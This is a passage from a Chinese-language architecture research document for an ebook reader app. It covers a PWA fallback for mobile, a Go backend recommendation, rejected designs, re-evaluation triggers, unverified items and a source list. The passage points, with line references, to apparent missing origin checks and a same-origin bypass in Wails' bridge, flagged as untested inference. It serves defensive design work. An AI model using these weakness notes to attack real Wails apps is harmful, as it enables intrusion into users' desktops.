## 9. 移动端:Wails 走不通时的降级

| 情形 | 本地核心 | 结论 |
|------|----------|------|
| 移动端用 Wails v3(Go) | 与桌面**完全共用** `hpfcore`(SQLite/Turso、解析、HLC、outbox) | 收益最大。**风险**:Wails 官方文档把移动端标注为 **Experimental**(文档导航存在 "Your First Mobile App (Experimental)"、"Mobile (Experimental) Overview/iOS/Android",访问 2026-11-02)——不能作为 M1 的硬依赖 |
| 移动端退回 PWA(推荐作为 Plan B) | 无 Go 运行时:退化为 **W1**(在线优先 + 服务端权威合并),本地用 IndexedDB;解析/封面在服务端 | 功能可控:阅读位置与批注仍同步;代价是本地格式解析与"零后端离线"能力下降 |
| 移动端用别的原生方案(RN/Flutter) | 需第三份客户端实现 | ❌ 不建议(多实现 = 多份漂移) |

**降级不影响服务端契约**:只要服务端 API 与 locator 格式不变,桌面(Go 核心)与移动(PWA 瘦客户端)可以共存。

## 10. 结论与复评条件

### 10.1 明确推荐

| 决策 | 结论 | 强度 |
|------|------|------|
| 后端语言 | **Go**(chi + sqlc + pgx + Postgres) | **弱推荐**(优选,但非碾压) |
| 合并架构 | **服务端权威合并(S1)** + 客户端 outbox/apply | 强推荐 |
| 共享核心 | 抽成独立 module `hpfcore`(HLC + LWW 规则 + locator + 校验),桌面/移动/服务端共用 | 强推荐 |
| Web 端 | W1(在线优先 + 服务端权威),一致性靠 golden vectors | 强推荐 |
| 隔离架构 | Arch-A(引擎 frame + opaque 内容 frame),Arch-B 为退路 | 强推荐 |

### 10.2 我**没有**改变的部分(与上轮一致)

- 数据模型、同步协议、表结构、endpoint 设计(见 docs/research/20-backend-sync.md)全部沿用;换语言只影响实现方式,不影响契约。
- "服务端分配单调游标""墓碑 remove-wins""字段级 LWW""进度=时间新者胜 + 跨副本百分比只前移"等语义不变。
- 否决 Yjs/Automerge、否决 v1 套 Supabase 自托管、否决 Python 作主后端(仍可作 LLM sidecar)等结论不变。

### 10.3 被否方案与原因

| 方案 | 否决原因 |
|------|----------|
| TS/NestJS 后端(**不作首选,但不否决**) | 与 Go 外壳形成双工具链;合并核心需跨语言维护。若团队 TS 明显更强,选它完全合理 —— 它是**可接受的次选** |
| 纯前端本地化(无后端) | 与"完整多用户 + 跨设备同步 + Z-Library"目标冲突 |
| 后端也用 Go 但**客户端保留完整合并实现**(S2 却不同构) | 直接踩 Readest 的坑,禁止 |
| Go→WASM 作为 Web 端合并方案 | 未实测体积/性能;先按 W1 设计,留作复评项 |
| 依赖 Wails 官方 child-frame 保护 | 见 §3:该保护不在 HTTP 路径上,且 Linux 垫片自述同源可绕过 |

### 10.4 复评条件(满足任一即重新评估)

1. 团队 TS 熟练度显著高于 Go(以"首个可用版本交付时间"为准)。
2. Web/PWA 成为主战场(浏览器离线强需求 → 考虑 W2/W3)。
3. LLM 功能价值占比 >50%(→ 更倾向 TS + Python sidecar 的生态)。
4. Wails 官方修复了非 server 构建的来源/帧校验(§3 的 A-1/A-2)→ Go 的"安全性溢价"上升,可重新比较。
5. 移动端 Wails 仍停留在 Experimental 且 PWA 方案被否(→ 需重新评估移动端技术栈)。
6. 若最终选择 S2(客户端合并),共享核心收益变大 → Go 推荐强度从"弱"升为"强"。

---

## 11. 未验证事项(必须显式标注)

| 项 | 状态 |
|----|------|
| opaque origin 子 frame 通过**简单请求**触发桥调用是否真能产生副作用 | **源码推断,未实测** → PoC P-03 必测 |
| `AssetServerOptions.Middleware` 与 HTTPTransport 的**执行顺序**(能否在桥之前拦截) | **未验证**(transport.go:58-67 仅说明 Handler() 会被挂入中间件链)→ PoC 需确认 |
| Android `addJavascriptInterface` 注入的桥在子 frame 中的可见性 | **未验证** |
| iframe `csp` 属性在 WebKitGTK / WKWebView 的支持度 | **未验证** |
| DOMPurify 允许 data: 图片是否会引入 SVG 脚本执行路径 | **未验证**,需按 P-05/P-06 自测 |
| FreeType/字体解析链在各平台的实际可利用性 | **未验证**(NVD 112 条 freetype 相关记录,未逐条核验) |
| CSS 外泄与远程追踪的一手研究链接 | **未验证**(本文按设计风险陈述,未引用具体论文) |
| EPUB 专用 zip 炸弹 CVE | **未找到**(仅有通用 zip 处理类 CVE) |
| Go→WASM 体积/性能 | **未实测** |
| Wails 移动端成熟度 | 官方标为 Experimental(文档,访问 2026-11-02),未做实测 |
| coreos/go-oidc、markbates/goth 等 OAuth 库 | **未核验** |
| Fiber 基于 fasthttp 的表述 | 据其官方文档,**本次未逐行核验** |

## 12. 来源清单(访问日期均为 2026-11-02)

### Wails(源码为 wailsapp/wails master 分支,depth=1 稀疏检出)

| # | 来源 | 用途 |
|---|------|------|
| 1 | <https://github.com/wailsapp/wails/blob/master/v3/pkg/application/transport_http_notserver.go> | **非 server 构建无校验**(第 1-13 行) |
| 2 | <https://github.com/wailsapp/wails/blob/master/v3/pkg/application/transport_http_server.go> | server 构建的 Origin 校验(第 13-74 行) |
| 3 | <https://github.com/wailsapp/wails/blob/master/v3/pkg/application/transport_http.go> | `/wails/runtime` 路由(156-168)、无 Content-Type 校验(283-291) |
| 4 | <https://github.com/wailsapp/wails/blob/master/v3/pkg/application/messageprocessor.go> | 请求身份来自客户端头的窗口标识(85-160) |
| 5 | <https://github.com/wailsapp/wails/blob/master/v3/pkg/application/application.go> | 窗口头注入(390-402)、childFrame 拒收(889-895)、OriginInfo(268-278) |
| 6 | <https://github.com/wailsapp/wails/blob/master/v3/pkg/application/linux_child_frame_guard.go> | Linux 垫片及其**同源绕过限制**(6-15 行) |
| 7 | <https://github.com/wailsapp/wails/blob/master/v3/internal/assetserver/bundledassets/runtime.debug.js> | 传输实现 runtimeURL()(142)、头(165-168) |
| 8 | <https://github.com/wailsapp/wails/blob/master/v3/pkg/application/application_options.go> | 默认传输说明(119)、WebSocketOriginPatterns(163-187) |
| 9 | <https://wails.io/guides/security/> | 官方安全文档(Last updated Nov 2, 2026)—— 未覆盖 iframe/桥 |
| 10 | <https://wails.io/contributing/asset-server/>、<https://wails.io/guides/mobile/> | 资产服务器结构;移动端 Experimental |

### foliate-js / Readest

| # | 来源 | 用途 |
|---|------|------|
| 11 | <https://github.com/readest/foliate-js/blob/main/paginator.js>(783、885 行) | `sandbox="allow-same-origin allow-scripts"` + srcdoc |
| 12 | <https://github.com/readest/foliate-js/blob/main/fixed-layout.js>(674、704 行) | 同上(固定版式路径) |
| 13 | <https://github.com/readest/foliate-js/blob/main/README.md>(79 行) | WebKit Bug 218086 → 必须 allow-scripts |
| 14 | <https://github.com/readest/readest/blob/main/apps/readest-app/src/services/transformers/sanitizer.ts>(37-62 行) | Readest 的 DOMPurify 策略 |
| 15 | <https://github.com/readest/readest/blob/main/apps/readest-app/src/app/api/opds/proxy/route.ts>(390-398 行) | CSP: sandbox; default-src none; frame-ancestors none + nosniff |

### 漏洞与攻击面

| # | 来源 | 用途 |
|---|------|------|
| 16 | NVD API <https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=epub>(2026-11-02 查询,共 32 条) | CVE-2016-10187(Calibre 任意文件读)、CVE-2016-9487(EpubCheck XXE,CVSS 7.8)、CVE-2016-7666、CVE-2019-20824 |
| 17 | NVD API keywordSearch=calibre(43 条) | CVE-2020-12627(calibre-web 认证绕过 CVSS 9.8)、CVE-2021-25965(CSRF 8.8)、CVE-2021-44686(ReDoS 7.5) |
| 18 | NVD API keywordSearch=pdf.js(15 条) | CVE-2013-5598(PDF.js IFRAME 特权问题)等 |
| 19 | NVD API keywordSearch=zip bomb(36 条) | CVE-2019-13232(Info-ZIP 重叠条目) |
| 20 | <https://www.cve.org/CVERecord?id=CVE-2026-55408> · <https://cveinfo.com/cve/CVE-2026-55408> | Koodo Reader EPUB → RCE(CVSS 8.4,修复 2.3.1,2026-07-07) |

### Go 生态(均经 GitHub API 核验,2026-11-02)

| # | 来源 | stars / 最近 push |
|---|------|-------------------|
| 21 | <https://github.com/go-chi/chi> | 23,041 / 2026-10-18 |
| 22 | <https://github.com/labstack/echo> · <https://github.com/gin-gonic/gin> · <https://github.com/gofiber/fiber> | 32,786 / 2026-10-30 · 89,474 / 2026-10-10 · 40,241 / 2026-11-02 |
| 23 | <https://github.com/sqlc-dev/sqlc> | 18,432 / 2026-11-02 |
| 24 | <https://github.com/pressly/goose> · <https://github.com/ariga/atlas> | 11,651 / 2026-10-31 · 8,806 / 2026-10-28 |
| 25 | <https://github.com/jackc/pgx> | 14,374 / 2026-10-31 |
| 26 | <https://github.com/oapi-codegen/oapi-codegen> | 8,639 / 2026-11-01 |
| 27 | <https://github.com/riverqueue/river> · <https://github.com/hibiken/asynq> | 5,848 / 2026-11-02 · 13,806 / 2026-10-19 |
| 28 | <https://github.com/golang-jwt/jwt> | 9,260 / 2026-11-01 |
| 29 | <https://github.com/pgvector/pgvector> | 23,567 / 2026-10-31 |
| 30 | <https://github.com/ent/ent> · <https://github.com/go-gorm/gorm> | 17,221 / 2026-10-14 · 39,986 / 2026-10-24 |

### 本团队上一轮交付(本文复用其结论)

| # | 来源 | 用途 |
|---|------|------|
| 31 | docs/research/20-backend-sync.md(本仓库,2026-11-02) | 表结构、API、同步语义、Readest 两份合并实现的教训 |
